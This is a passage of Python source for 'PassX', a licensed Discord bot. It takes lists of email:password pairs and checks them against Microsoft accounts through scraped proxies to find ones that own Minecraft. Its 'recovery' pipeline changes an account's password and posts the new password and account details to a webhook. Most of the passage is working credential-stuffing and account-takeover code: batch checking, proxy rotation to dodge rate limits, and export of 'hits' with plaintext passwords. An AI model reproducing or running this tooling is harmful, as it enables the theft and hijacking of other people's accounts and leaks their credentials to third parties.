            await prog.step_done(4, f"{E_TICK()}  **Password changed successfully.**")

        result = _pack_result(email, password, actual_password, account_info, user_id)
        await send_to_webhook(result)
        data_manager.update_stats(user_id, True)

        if channel:
            await channel.send(embed=ok(
                "Password Changed",
                f"{E_TICK()}  `{email}` is live.\n"
                f"**New password:** `{actual_password}`\n\n"
                f"{SEP}\n"
                f"Results posted to webhook.",
                [
                    {"name": "📧  Email", "value": f"`{email}`", "inline": False},
                    {"name": "🔒  New Password", "value": f"`{actual_password}`", "inline": True},
                    {"name": "👤  Name", "value": str(account_info.get("name", "—")), "inline": True},
                    {"name": "🎮  Gamertag", "value": str(account_info.get("gamertag", "—")), "inline": True},
                ]
            ))

    except Exception as e:
        traceback.print_exc()
        if prog:
            try:
                await prog.step_fail(3, f"{E_CROSS()}  `{_clip(e, 180)}`")
            except Exception:
                pass
        await tell_user(channel, user_id, "Processing Error", e, email=email)
        data_manager.update_stats(user_id, False)
    finally:
        if do_cleanup:
            _cleanup(user_id, driver, session)


def check_auth(command_name: str = "this command"):
    def decorator(func):
        async def wrapper(interaction: discord.Interaction, *args, **kwargs):
            uid = interaction.user.id
            if uid == ADMIN_ID or data_manager.is_owner(uid):
                return await func(interaction, *args, **kwargs)
            if not data_manager.config.get("bot_enabled", True):
                await interaction.response.send_message(
                    embed=err("Bot Disabled", f"{E_CROSS()}  PassX is currently disabled by an owner."),
                    ephemeral=True
                )
                return
            if not data_manager.is_authorized(uid) and not has_valid_license(uid):
                await interaction.response.send_message(
                    embed=err(
                        "Not Authorized",
                        f"{E_CROSS()}  You don't have access to `{command_name}`.\n"
                        f"Redeem a key with `/redeem` or ask an owner."
                    ),
                    ephemeral=True
                )
                return
            return await func(interaction, *args, **kwargs)
        wrapper.__name__ = func.__name__
        wrapper.__qualname__ = getattr(func, "__qualname__", func.__name__)
        wrapper.__wrapped__ = func
        return wrapper
    return decorator


def check_login():
    def decorator(func):
        async def wrapper(interaction: discord.Interaction, *args, **kwargs):
            uid = interaction.user.id
            if uid == ADMIN_ID or data_manager.is_owner(uid):
                return await func(interaction, *args, **kwargs)
            if not data_manager.is_authenticated(uid):
                await interaction.response.send_message(
                    embed=warn(
                        "Not Logged In",
                        f"{E_ALERT()}  Use `/request_otp` then `/verify_otp` first."
                    ),
                    ephemeral=True
                )
                return
            return await func(interaction, *args, **kwargs)
        wrapper.__name__ = func.__name__
        wrapper.__qualname__ = getattr(func, "__qualname__", func.__name__)
        wrapper.__wrapped__ = func
        return wrapper
    return decorator


def owner_only():
    def decorator(func):
        async def wrapper(interaction: discord.Interaction, *args, **kwargs):
            uid = interaction.user.id
            if uid != ADMIN_ID and not data_manager.is_owner(uid):
                await interaction.response.send_message(
                    embed=err("Owner Only", f"{E_CROSS()}  This command is restricted to owners."),
                    ephemeral=True
                )
                return
            return await func(interaction, *args, **kwargs)
        wrapper.__name__ = func.__name__
        wrapper.__qualname__ = getattr(func, "__qualname__", func.__name__)
        wrapper.__wrapped__ = func
        return wrapper
    return decorator


@bot.tree.command(name="help", description="Show all PassX commands")
async def help_cmd(i: discord.Interaction):
    uid = i.user.id
    is_own = uid == ADMIN_ID or data_manager.is_owner(uid)
    user_cmds = (
        f"`/help` — this menu\n"
        f"`/request_otp` — send a login OTP\n"
        f"`/verify_otp` — verify OTP and start a session\n"
        f"`/logout` — end your session\n"
        f"`/process` — run password recovery on `email:password`\n"
        f"`/submit_captcha` — submit CAPTCHA text\n"
        f"`/stop` — abort your running pipeline\n"
        f"`/status` — show your current pipeline\n"
        f"`/stats` — your processing stats\n"
        f"`/mccheck` — check one Microsoft account for Minecraft\n"
        f"`/mccheck_file` — batch check a `.txt` of `email:password`\n"
        f"`/redeem` — redeem a license key"
    )
    owner_cmds = (
        f"`/admin` — owner control panel\n"
        f"`/genkey` — generate license keys\n"
        f"`/grant` — grant lifetime to a user\n"
        f"`/keys` — list keys\n"
        f"`/revoke` — revoke a user's keys\n"
        f"`/addowner` `/removeowner` `/owners`\n"
        f"`/webhook` `/ownerwebhook`\n"
        f"`/toggle` — enable/disable the bot\n"
        f"`/authorize` `/deauthorize` `/list_users`\n"
        f"`/admin_stats` `/reset_stats` `/broadcast`"
    )
    e = brand("PassX Commands", f"{SEP}\nPassX Made By The X Team")
    e.add_field(name=f"{E_PIN()}  User", value=user_cmds[:1024], inline=False)
    if is_own:
        e.add_field(name=f"{E_SETTINGS()}  Owner", value=owner_cmds[:1024], inline=False)
    e.add_field(
        name=f"{E_UPDATES()}  Flow",
        value="`/request_otp` → `/verify_otp` → `/process email:pass` → `/submit_captcha` → done",
        inline=False
    )
    await i.response.send_message(embed=e, ephemeral=True)


@bot.tree.command(name="request_otp", description="Request a one-time login code")
async def request_otp_cmd(i: discord.Interaction):
    uid = i.user.id
    if uid != ADMIN_ID and not data_manager.is_owner(uid):
        if not data_manager.is_authorized(uid) and not has_valid_license(uid):
            await i.response.send_message(
                embed=err("Not Authorized", f"{E_CROSS()}  You need a valid license or authorization."),
                ephemeral=True
            )
            return
    otp = data_manager.generate_otp(uid)
    try:
        await i.user.send(embed=info(
            "Your OTP",
            f"{E_MAIL()}  Code: `{otp}`\nExpires in **5 minutes**.\nUse `/verify_otp` here or in the server."
        ))
        await i.response.send_message(
            embed=ok("OTP Sent", f"{E_TICK()}  Check your DMs."),
            ephemeral=True
        )
    except discord.Forbidden:
        await i.response.send_message(
            embed=warn("DMs Closed", f"{E_ALERT()}  Enable DMs and retry, or use this code now: `{otp}`"),
            ephemeral=True
        )


@bot.tree.command(name="verify_otp", description="Verify your OTP and start a 24h session")
@app_commands.describe(code="6-digit OTP")
async def verify_otp_cmd(i: discord.Interaction, code: str):
    ok_auth, msg = data_manager.verify_otp(i.user.id, code.strip())
    if ok_auth:
        await i.response.send_message(embed=ok("Authenticated", f"{E_TICK()}  {msg}"), ephemeral=True)
        await send_webhook_log("User Login", f"<@{i.user.id}> authenticated", color=C_SUCCESS, user_id=i.user.id)
    else:
        await i.response.send_message(embed=err("OTP Failed", f"{E_CROSS()}  {msg}"), ephemeral=True)


@bot.tree.command(name="logout", description="End your authenticated session")
async def logout_cmd(i: discord.Interaction):
    data_manager.logout(i.user.id)
    await i.response.send_message(embed=ok("Logged Out", f"{E_TICK()}  Session cleared."), ephemeral=True)


@bot.tree.command(name="process", description="Start password recovery for email:password")
@app_commands.describe(account="Format: email:password")
@check_auth("process")
@check_login()
async def process_cmd(i: discord.Interaction, account: str):
    uid = i.user.id
    if uid in data_manager.processing_sessions and not data_manager.processing_sessions[uid].get("stop"):
        await i.response.send_message(
            embed=warn("Already Running", f"{E_ALERT()}  Finish or `/stop` the current pipeline first."),
            ephemeral=True
        )
        return
    if ":" not in account:
        await i.response.send_message(
            embed=err("Invalid Format", f"{E_CROSS()}  Expected `email:password`"),
            ephemeral=True
        )
        return
    email, password = account.split(":", 1)
    email, password = email.strip(), password.strip()
    if not email or not password:
        await i.response.send_message(
            embed=err("Invalid Format", f"{E_CROSS()}  Email and password required."),
            ephemeral=True
        )
        return
    await i.response.defer()
    ch = i.channel
    await i.followup.send(embed=brand("Pipeline Queued", f"{E_RECORD()}  Starting recovery for `{email}`"))
    asyncio.create_task(process_account_full(email, password, uid, ch))


@bot.tree.command(name="submit_captcha", description="Submit the CAPTCHA text for your running pipeline")
@app_commands.describe(answer="Text shown in the CAPTCHA image")
@check_auth("submit_captcha")
@check_login()
async def submit_captcha_cmd(i: discord.Interaction, answer: str):
    uid = i.user.id
    if uid not in data_manager.processing_sessions:
        await i.response.send_message(
            embed=warn("No Session", f"{E_ALERT()}  No CAPTCHA waiting. Run `/process` first."),
            ephemeral=True
        )
        return
    await continue_after_captcha(uid, answer.strip(), i)


@bot.tree.command(name="stop", description="Abort your running pipeline")
@check_login()
async def stop_cmd(i: discord.Interaction):
    uid = i.user.id
    try:
        await i.response.defer(ephemeral=True)
    except Exception:
        pass
    ok_stop = await _abort_pipeline(uid, "Stopped by user")
    try:
        if ok_stop:
            await i.followup.send(embed=ok("Stopped", f"{E_TICK()}  Pipeline aborted."), ephemeral=True)
        else:
            await i.followup.send(embed=info("Idle", "Nothing running."), ephemeral=True)
    except Exception:
        pass


@bot.tree.command(name="status", description="Show your current pipeline status")
@check_login()
async def status_cmd(i: discord.Interaction):
    uid = i.user.id
    s = data_manager.processing_sessions.get(uid)
    if not s:
        await i.response.send_message(embed=info("Idle", "No active pipeline."), ephemeral=True)
        return
    started = s.get("start_time") or datetime.now()
    elapsed = int((datetime.now() - started).total_seconds()) if isinstance(started, datetime) else 0
    m, sec = divmod(elapsed, 60)
    await i.response.send_message(embed=info(
        "Pipeline Status",
        f"Email: `{s.get('email', '?')}`\n"
        f"Temp mail: `{s.get('temp_email', '—')}`\n"
        f"Elapsed: `{m}m {sec}s`\n"
        f"Stop flag: `{s.get('stop')}`\n"
        f"CAPTCHA attempts: `{s.get('captcha_attempts', 0)}`"
    ), ephemeral=True)


@bot.tree.command(name="stats", description="Your processing stats")
@check_login()
async def stats_cmd(i: discord.Interaction):
    u = data_manager.stats.get("users_served", {}).get(str(i.user.id), {"processed": 0, "success": 0})
    await i.response.send_message(embed=info(
        "Your Stats",
        f"Processed: **{u.get('processed', 0)}**\n"
        f"Success: **{u.get('success', 0)}**"
    ), ephemeral=True)


@bot.tree.command(name="redeem", description="Redeem a license key")
@app_commands.describe(key="Your PassX license key")
async def redeem_cmd(i: discord.Interaction, key: str):
    ok_r, msg = redeem_key(i.user.id, key.strip())
    if ok_r:
        await i.response.send_message(embed=ok("Key Redeemed", f"{E_TICK()}  {msg}"), ephemeral=True)
        await send_webhook_log("Key Redeemed", f"<@{i.user.id}> redeemed a key", color=C_SUCCESS, user_id=i.user.id)
    else:
        await i.response.send_message(embed=err("Redeem Failed", f"{E_CROSS()}  {msg}"), ephemeral=True)


@bot.tree.command(name="mccheck", description="Check a Microsoft account for Minecraft ownership & stats")
@app_commands.describe(account="Format: email:password", proxy_mode="Use scraped proxies or go proxyless")
@app_commands.choices(proxy_mode=[
    app_commands.Choice(name="Use Proxies (Recommended)", value="proxy"),
    app_commands.Choice(name="Proxyless", value="proxyless"),
])
@check_auth("checker")
@check_login()
async def mc_check_cmd(i: discord.Interaction, account: str, proxy_mode: str = "proxy"):
    uid = i.user.id
    if ":" not in account:
        await i.response.send_message(
            embed=err("Invalid Format", f"{E_CROSS()}  Expected `email:password`"), ephemeral=True
        )
        return
    email, password = account.split(":", 1)
    email, password = email.strip(), password.strip()
    use_proxy = proxy_mode == "proxy"
    await i.response.defer(ephemeral=True)
    loop = asyncio.get_event_loop()
    try:
        from automation.mc_checker import check_mc_account
        result = await loop.run_in_executor(None, check_mc_account, email, password, use_proxy)
    except Exception as e:
        await tell_user(i.channel, uid, "MC Check — Error", e, email=email)
        await i.followup.send(embed=err("Checker Error", f"```{_clip(e, 900)}```"), ephemeral=True)
        return

    if not isinstance(result, dict):
        await i.followup.send(embed=err("Checker Error", f"{E_CROSS()}  Empty result for `{email}`"), ephemeral=True)
        return

    status = result.get("status", "error")
    if status == "bad":
        await i.followup.send(
            embed=err("Invalid Account", f"{E_CROSS()}  Wrong password or account doesn't exist.\n`{email}`"),
            ephemeral=True
        )
        return
    if status == "2fa":
        extra = result.get("error") or "Account has 2FA/security verification enabled."
        await i.followup.send(embed=warn("2FA Enabled", f"{E_ALERT()}  {extra}\n`{email}`"), ephemeral=True)
        return
    if status == "no_mc":
        await i.followup.send(
            embed=info("No Minecraft", f"{E_UPDATES()}  Valid account, does **not** own Minecraft.\n`{email}`"),
            ephemeral=True
        )
        return
    if status == "valid_no_mc":
        await i.followup.send(
            embed=info("Valid Login — No MC", f"{E_TICK()}  Login valid but no Minecraft token.\n`{email}`\n{result.get('error','')}"),
            ephemeral=True
        )
        return
    if status == "locked":
        await i.followup.send(
            embed=err("Account Locked", f"{E_CROSS()}  Account is locked by Microsoft.\n`{email}`"),
            ephemeral=True
        )
        return
    if status == "rate_limited":
        await i.followup.send(
            embed=warn("Rate Limited", f"{E_ALERT()}  Microsoft blocked this check.\n`{email}`\nRerun with the other proxy mode."),
            ephemeral=True
        )
        return
    if status != "hit":
        await i.followup.send(
            embed=err("Check Failed", f"{E_CROSS()}  `{email}`\n```{_clip(result.get('error', status), 900)}```"),
            ephemeral=True
        )
        return

    username = result.get("username", "N/A")
    uuid_val = result.get("uuid", "N/A")
    ownership = result.get("ownership", "Unknown")
    capes = result.get("capes", "None")
    hypixel = result.get("hypixel") or {}
    optifine = result.get("optifine_cape")
    name_change = result.get("name_change") or {}
    fields = [
        {"name": "📧  Email", "value": f"`{email}`", "inline": False},
        {"name": "🔒  Password", "value": f"||`{password}`||", "inline": True},
        {"name": "🎮  Username", "value": f"`{username}`", "inline": True},
        {"name": "🆔  UUID", "value": f"`{uuid_val}`", "inline": False},
        {"name": "👑  Ownership", "value": f"`{ownership}`", "inline": True},
        {"name": "🧥  Capes", "value": f"`{str(capes)[:900]}`", "inline": True},
    ]
    if optifine is not None:
        fields.append({"name": "✨  Optifine Cape", "value": "Yes" if optifine else "No", "inline": True})
    if hypixel:
        hyp_parts = []
        if hypixel.get("banned"):
            hyp_parts.append("**BANNED**")
        if hypixel.get("level"):
            hyp_parts.append(f"Level: **{hypixel['level']}**")
        if hypixel.get("first_login"):
            hyp_parts.append(f"First Login: {hypixel['first_login']}")
        if hypixel.get("last_login"):
            hyp_parts.append(f"Last Login: {hypixel['last_login']}")
        if hypixel.get("bw_stars"):
            hyp_parts.append(f"BW Stars: {hypixel['bw_stars']}")
        if hyp_parts:
            fields.append({"name": "⬛  ━━ HYPIXEL ━━", "value": "\u200b", "inline": False})
            fields.append({"name": "📊  Stats", "value": "\n".join(hyp_parts)[:1000], "inline": False})
    if name_change:
        nc_parts = []
        if name_change.get("can_change"):
            nc_parts.append(f"Can Change: **{name_change['can_change']}**")
        if name_change.get("last_changed"):
            nc_parts.append(f"Last Changed: {name_change['last_changed']}")
        if nc_parts:
            fields.append({"name": "📝  Name Change", "value": "\n".join(nc_parts)[:1000], "inline": False})
    fields.append({
        "name": "🌐  Proxy Mode",
        "value": f"`{'Proxies' if use_proxy else 'Proxyless'}`",
        "inline": True
    })
    embed = ok(f"Minecraft Hit — {username}", f"{E_TICK()}  Account owns Minecraft!", fields)
    if uuid_val and uuid_val != "N/A":
        embed.set_thumbnail(url=f"https://crafatar.com/avatars/{uuid_val}?overlay=true")
    await i.followup.send(embed=embed, ephemeral=True)
    await send_webhook_log(
        "MC Check — Hit",
        f"`{email}` owns **{ownership}** — Username: `{username}`",
        [
            {"name": "Ownership", "value": str(ownership)[:900], "inline": True},
            {"name": "Username", "value": f"`{username}`", "inline": True},
            {"name": "Capes", "value": str(capes)[:900], "inline": True},
        ],
        color=C_SUCCESS, user_id=uid
    )


@bot.tree.command(name="mccheck_file", description="Batch check accounts from a txt file (email:password per line)")
@app_commands.describe(file="Upload a .txt file with email:password on each line", proxy_mode="Use scraped proxies or go proxyless")
@app_commands.choices(proxy_mode=[
    app_commands.Choice(name="Use Proxies (Recommended)", value="proxy"),
    app_commands.Choice(name="Proxyless", value="proxyless"),
])
@check_auth("checker")
@check_login()
async def mc_check_file_cmd(i: discord.Interaction, file: discord.Attachment, proxy_mode: str = "proxy"):
    uid = i.user.id
    if not (file.filename or "").lower().endswith(".txt"):
        await i.response.send_message(embed=err("Invalid File", f"{E_CROSS()}  Please upload a `.txt` file."), ephemeral=True)
        return
    if file.size > 2_000_000:
        await i.response.send_message(embed=err("File Too Large", f"{E_CROSS()}  Max file size: 2MB"), ephemeral=True)
        return
    await i.response.defer()
    try:
        content = (await file.read()).decode("utf-8", errors="ignore")
    except Exception as e:
        await i.followup.send(embed=err("Read Error", f"{E_CROSS()}  Could not read file:\n```{_clip(e, 800)}```"))
        return
    lines = []
    seen = set()
    for raw in content.splitlines():
        l = raw.strip().lstrip("\ufeff")
        if not l or l.startswith("#") or ":" not in l:
            continue
        if l.lower() in seen:
            continue
        seen.add(l.lower())
        lines.append(l)
    if not lines:
        await i.followup.send(embed=err("Empty File", f"{E_CROSS()}  No valid `email:password` lines found."))
        return
    MAX_BATCH = 200
    truncated = 0
    if len(lines) > MAX_BATCH:
        truncated = len(lines) - MAX_BATCH
        lines = lines[:MAX_BATCH]
    use_proxy = proxy_mode == "proxy"
    total = len(lines)
    note = f"\n(capped at {MAX_BATCH}, skipped {truncated})" if truncated else ""
    progress_msg = await i.followup.send(embed=brand(
        "MC Batch Check Started",
        f"{E_RECORD()}  Checking **{total}** accounts...{note}\nMode: `{'Proxies' if use_proxy else 'Proxyless'}`"
    ))

    async def run_batch():
        from automation.mc_checker import check_mc_account
        loop = asyncio.get_event_loop()
        hits, no_mc, bad, twofa, locked, limited, errors, valid_no = [], [], [], [], [], [], [], []
        hits_raw = []
        done = 0
        for line in lines:
            try:
                email, password = line.split(":", 1)
                email, password = email.strip(), password.strip()
                if not email or not password:
                    bad.append(line[:80])
                    done += 1
                    continue
                result = await loop.run_in_executor(None, check_mc_account, email, password, use_proxy)
                if not isinstance(result, dict):
                    errors.append(f"`{email}` empty result")
                    done += 1
                    continue
                status = result.get("status", "error")
                if status == "hit":
                    uname = result.get("username", "N/A")
                    own = result.get("ownership", "Unknown")
                    hits.append(f"`{email}` — **{uname}** ({own})")
                    hits_raw.append(
                        f"{email}:{password} | {uname} | {own} | {result.get('uuid', '')} | capes={result.get('capes', '')}"
                    )
                elif status == "no_mc":
                    no_mc.append(f"`{email}`")
                elif status == "valid_no_mc":
                    valid_no.append(f"`{email}`")
                elif status == "2fa":
                    twofa.append(f"`{email}`")
                elif status == "bad":
                    bad.append(f"`{email}`")
                elif status == "locked":
                    locked.append(f"`{email}`")
                elif status == "rate_limited":
                    limited.append(f"`{email}`")
                else:
                    errtxt = _clip(result.get("error") or status, 80)
                    errors.append(f"`{email}` — {errtxt}")
            except Exception as e:
                errors.append(f"`{line[:40]}` — {_clip(e, 60)}")
            done += 1
            if done % 5 == 0 or done == total:
                try:
                    await progress_msg.edit(embed=brand(
                        "MC Batch Check Running",
                        f"{E_RECORD()}  `{done}/{total}`  hits **{len(hits)}**  no-mc **{len(no_mc)}**  "
                        f"bad **{len(bad)}**  2fa **{len(twofa)}**  err **{len(errors)}**"
                    ))
                except Exception:
                    pass

        fields = []
        _add_chunked_field(fields, f"{E_TICK()}  Hits ({len(hits)})", hits)
        _add_chunked_field(fields, f"{E_UPDATES()}  No MC ({len(no_mc)})", no_mc)
        _add_chunked_field(fields, "Valid login, no MC token", valid_no)
        _add_chunked_field(fields, f"{E_ALERT()}  2FA ({len(twofa)})", twofa)
        _add_chunked_field(fields, "Locked", locked)
        _add_chunked_field(fields, "Rate limited", limited)
        _add_chunked_field(fields, f"{E_CROSS()}  Bad ({len(bad)})", bad)
        _add_chunked_field(fields, f"⚠️  Errors ({len(errors)})", errors, limit_chunks=2)
        fields.append({
            "name": "📊  Summary",
            "value": (
                f"{E_TICK()} Hits: **{len(hits)}** | No MC: **{len(no_mc)}** | "
                f"2FA: **{len(twofa)}** | Bad: **{len(bad)}** | "
                f"Locked: **{len(locked)}** | RL: **{len(limited)}** | Errors: **{len(errors)}**"
            )[:1000],
            "inline": False,
        })
        embed = ok("Batch Check Complete", f"Checked **{total}** accounts\n{SEP}", fields)
        files = []
        if hits_raw:
            buf = io.BytesIO(("\n".join(hits_raw) + "\n").encode("utf-8"))
            files.append(discord.File(buf, filename="mc_hits.txt"))
        try:
            await i.channel.send(content=f"<@{uid}>", embed=embed, files=files)
        except Exception as e:
            try:
                await i.channel.send(content=f"<@{uid}> batch done — hits {len(hits)} — embed failed: `{e}`")
            except Exception:
                pass
        await send_webhook_log(
            "MC Batch Check Complete",
            f"<@{uid}> checked **{total}** accounts — **{len(hits)}** hits",
            [
                {"name": "Hits", "value": str(len(hits)), "inline": True},
                {"name": "Bad", "value": str(len(bad)), "inline": True},
                {"name": "2FA", "value": str(len(twofa)), "inline": True},
            ],
            color=C_SUCCESS if hits else C_WARN, user_id=uid
        )

    asyncio.create_task(run_batch())


@bot.tree.command(name="admin", description="Owner control panel")
@owner_only()
async def admin_cmd(i: discord.Interaction):
    enabled = data_manager.config.get("bot_enabled", True)
    n_auth = len(data_manager.authorized_users)
    n_own = len(data_manager.load_owners())
    n_sess = len(data_manager.processing_sessions)
    await i.response.send_message(embed=adm(
        "Admin Panel",
        f"Bot enabled: **{enabled}**\n"
        f"Owners: **{n_own}**\n"
        f"Authorized users: **{n_auth}**\n"
        f"Active pipelines: **{n_sess}**\n"
        f"Processed: **{data_manager.stats.get('total_processed', 0)}**\n"
        f"Success: **{data_manager.stats.get('total_success', 0)}**\n"
        f"Failed: **{data_manager.stats.get('total_failed', 0)}**"
    ), ephemeral=True)


@bot.tree.command(name="genkey", description="Generate license keys")
@app_commands.describe(count="How many keys", duration="e.g. 1d, 7d, 30d, lifetime")
@owner_only()
async def genkey_cmd(i: discord.Interaction, count: int = 1, duration: str = "30d"):
    count = max(1, min(int(count), 50))
    keys = []
    for _ in range(count):
        k = generate_key(i.user.id, duration)
        keys.append(k if isinstance(k, str) else str(k))
    body = "\n".join(f"`{k}`" for k in keys) or "none"
    if len(body) > 1000:
        buf = io.BytesIO(("\n".join(keys) + "\n").encode("utf-8"))
        await i.response.send_message(
            embed=ok("Keys Generated", f"{E_TICK()}  `{count}` keys · duration `{duration}`"),
            file=discord.File(buf, filename="keys.txt"),
            ephemeral=True
        )
    else:
        await i.response.send_message(
            embed=ok("Keys Generated", f"{E_TICK()}  `{count}` keys · duration `{duration}`\n{body}"),
            ephemeral=True
        )


@bot.tree.command(name="grant", description="Grant lifetime license to a user")
@app_commands.describe(user="Discord user")
@owner_only()
async def grant_cmd(i: discord.Interaction, user: discord.User):
    grant_lifetime(user.id, i.user.id)
    data_manager.authorize_user(user.id, i.user.id)
    await i.response.send_message(
        embed=ok("Granted", f"{E_TICK()}  Lifetime + authorize for {user.mention}"),
        ephemeral=True
    )


@bot.tree.command(name="keys", description="List license keys")
@owner_only()
async def keys_cmd(i: discord.Interaction):
    all_keys = list_all_keys()
    if not all_keys:
        await i.response.send_message(embed=info("Keys", "No keys stored."), ephemeral=True)
        return
    lines = []
    if isinstance(all_keys, dict):
        for k, meta in list(all_keys.items())[:80]:
            lines.append(f"`{k}` — {meta}")
    elif isinstance(all_keys, list):
        for item in all_keys[:80]:
            lines.append(f"`{item}`")
    else:
        lines.append(str(all_keys)[:1000])
    text = "\n".join(str(x)[:120] for x in lines)[:1000]
    await i.response.send_message(embed=info("Keys", text or "none"), ephemeral=True)


@bot.tree.command(name="revoke", description="Revoke a user's keys and authorization")
@app_commands.describe(user="Discord user")
@owner_only()
async def revoke_cmd(i: discord.Interaction, user: discord.User):
    revoke_user_keys(user.id)
    data_manager.revoke_user(user.id)
    data_manager.logout(user.id)
    await i.response.send_message(
        embed=ok("Revoked", f"{E_TICK()}  Keys + auth removed for {user.mention}"),
        ephemeral=True
    )


@bot.tree.command(name="addowner", description="Add a bot owner")
@app_commands.describe(user="Discord user")
@owner_only()
async def addowner_cmd(i: discord.Interaction, user: discord.User):
    owners = data_manager.load_owners()
    if user.id not in owners:
        owners.append(user.id)
        data_manager.save_owners(owners)
    await i.response.send_message(embed=ok("Owner Added", f"{E_TICK()}  {user.mention}"), ephemeral=True)


@bot.tree.command(name="removeowner", description="Remove a bot owner")
@app_commands.describe(user="Discord user")
@owner_only()
async def removeowner_cmd(i: discord.Interaction, user: discord.User):
    if user.id == ADMIN_ID:
        await i.response.send_message(embed=err("Denied", "Cannot remove the primary admin."), ephemeral=True)
        return
    owners = [o for o in data_manager.load_owners() if o != user.id]
    data_manager.save_owners(owners)
    await i.response.send_message(embed=ok("Owner Removed", f"{E_TICK()}  {user.mention}"), ephemeral=True)


@bot.tree.command(name="owners", description="List bot owners")
@owner_only()
async def owners_cmd(i: discord.Interaction):
    owners = data_manager.load_owners()
    mentions = " ".join(f"<@{o}>" for o in owners) or "none"
    await i.response.send_message(
        embed=info("Owners", f"Primary admin: <@{ADMIN_ID}>\n{mentions}"),
        ephemeral=True
    )


@bot.tree.command(name="webhook", description="Set the results webhook URL")
@app_commands.describe(url="Discord webhook URL (empty to clear)")
@owner_only()
async def webhook_cmd(i: discord.Interaction, url: str = ""):
    data_manager.config["webhook_url"] = url.strip()
    data_manager.save_config()
    shown = "`set`" if url.strip() else "`cleared`"
    await i.response.send_message(embed=ok("Webhook", f"{E_TICK()}  Results webhook {shown}"), ephemeral=True)


@bot.tree.command(name="ownerwebhook", description="Set the owner log webhook URL")
@app_commands.describe(url="Discord webhook URL (empty to clear)")
@owner_only()
async def ownerwebhook_cmd(i: discord.Interaction, url: str = ""):
    data_manager.config["owner_webhook_url"] = url.strip()
    data_manager.save_config()
    shown = "`set`" if url.strip() else "`cleared`"
    await i.response.send_message(embed=ok("Owner Webhook", f"{E_TICK()}  Owner webhook {shown}"), ephemeral=True)


@bot.tree.command(name="toggle", description="Enable or disable the bot for non-owners")
@owner_only()
async def toggle_cmd(i: discord.Interaction):
    data_manager.config["bot_enabled"] = not data_manager.config.get("bot_enabled", True)
    data_manager.save_config()
    state = "ENABLED" if data_manager.config["bot_enabled"] else "DISABLED"
    await i.response.send_message(embed=ok("Toggled", f"{E_TICK()}  Bot is now **{state}**"), ephemeral=True)


@bot.tree.command(name="authorize", description="Authorize a user")
@app_commands.describe(user="Discord user")
@owner_only()
async def authorize_cmd(i: discord.Interaction, user: discord.User):
    data_manager.authorize_user(user.id, i.user.id)
    await i.response.send_message(embed=ok("Authorized", f"{E_TICK()}  {user.mention}"), ephemeral=True)


@bot.tree.command(name="deauthorize", description="Remove a user's authorization")
@app_commands.describe(user="Discord user")
@owner_only()
async def deauthorize_cmd(i: discord.Interaction, user: discord.User):
    data_manager.revoke_user(user.id)
    await i.response.send_message(embed=ok("Deauthorized", f"{E_TICK()}  {user.mention}"), ephemeral=True)


@bot.tree.command(name="list_users", description="List authorized users")
@owner_only()
async def list_users_cmd(i: discord.Interaction):
    users = list(data_manager.authorized_users.keys())
    body = " ".join(f"<@{u}>" for u in users[:80]) or "none"
    extra = f"\n…and {len(users) - 80} more" if len(users) > 80 else ""
    await i.response.send_message(
        embed=info("Authorized Users", f"Count: **{len(users)}**\n{body}{extra}"),
        ephemeral=True
    )


@bot.tree.command(name="admin_stats", description="Global bot stats")
@owner_only()
async def admin_stats_cmd(i: discord.Interaction):
    s = data_manager.stats
    await i.response.send_message(embed=adm(
        "Global Stats",
        f"Processed: **{s.get('total_processed', 0)}**\n"
        f"Success: **{s.get('total_success', 0)}**\n"
        f"Failed: **{s.get('total_failed', 0)}**\n"
        f"Users served: **{len(s.get('users_served', {}))}**\n"
        f"Live pipelines: **{len(data_manager.processing_sessions)}**"
    ), ephemeral=True)


@bot.tree.command(name="reset_stats", description="Reset global stats")
@owner_only()
async def reset_stats_cmd(i: discord.Interaction):
    data_manager.stats = {
        "total_processed": 0, "total_success": 0,
        "total_failed": 0, "users_served": {}
    }
    data_manager.save_stats()
    await i.response.send_message(embed=ok("Stats Reset", f"{E_TICK()}  Counters cleared."), ephemeral=True)


@bot.tree.command(name="broadcast", description="Broadcast a message to this channel")
@app_commands.describe(message="Message to send")
@owner_only()
async def broadcast_cmd(i: discord.Interaction, message: str):
    await i.response.send_message(embed=ok("Sent", "Broadcast posted."), ephemeral=True)
    await i.channel.send(embed=brand("PassX Broadcast", message[:4000]))


async def _refresh_presence():
    await bot.wait_until_ready()
    while not bot.is_closed():
        try:
            await bot.change_presence(
                activity=discord.Activity(type=discord.ActivityType.watching, name=STATUS)
            )
        except Exception:
            pass
        await asyncio.sleep(600)


@bot.event
async def on_ready():
    init(autoreset=True)
    print("")
    print(Fore.RED + Style.BRIGHT + """
    ██████╗  █████╗ ███████╗███████╗██╗  ██╗
    ██╔══██╗██╔══██╗██╔════╝██╔════╝╚██╗██╔╝
    ██████╔╝███████║███████╗███████╗ ╚███╔╝ 
    ██╔═══╝ ██╔══██║╚════██║╚════██║ ██╔██╗ 
    ██║     ██║  ██║███████║███████║██╔╝ ██╗
    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
    """)
    print(Fore.YELLOW + Style.BRIGHT + "                              B Y   X   T E A M")
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print(Fore.GREEN + Style.BRIGHT + f"  [BOT]     " + Fore.WHITE + f"Name:     " + Fore.CYAN + f"{bot.user.name}")
    print(Fore.GREEN + Style.BRIGHT + f"  [BOT]     " + Fore.WHITE + f"ID:       " + Fore.CYAN + f"{bot.user.id}")
    print(Fore.GREEN + Style.BRIGHT + f"  [ADMIN]   " + Fore.WHITE + f"ID:       " + Fore.YELLOW + f"{ADMIN_ID}")
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    try:
        mgr = get_proxy_manager()
        proxy_count = mgr.get_proxy_count()
        print(Fore.GREEN + Style.BRIGHT + f"  [PROXY]   " + Fore.WHITE + f"Pool:     " + Fore.CYAN + f"{proxy_count['valid']} valid / {proxy_count['total']} total")
        try:
            start_proxy_refresher(daemon=True)
        except TypeError:
            start_proxy_refresher()
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"  [PROXY]   " + Fore.YELLOW + f"Could not start proxy system: {e}")
    try:
        synced = await bot.tree.sync()
        print(Fore.GREEN + Style.BRIGHT + f"  ✓ Synced {len(synced)} slash commands successfully.\n")
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"  ✗ Sync error: {e}\n")
    try:
        await bot.change_presence(
            activity=discord.Activity(type=discord.ActivityType.watching, name=STATUS)
        )
    except Exception:
        pass
    try:
        asyncio.create_task(_refresh_presence())
    except Exception:
        pass


@bot.event
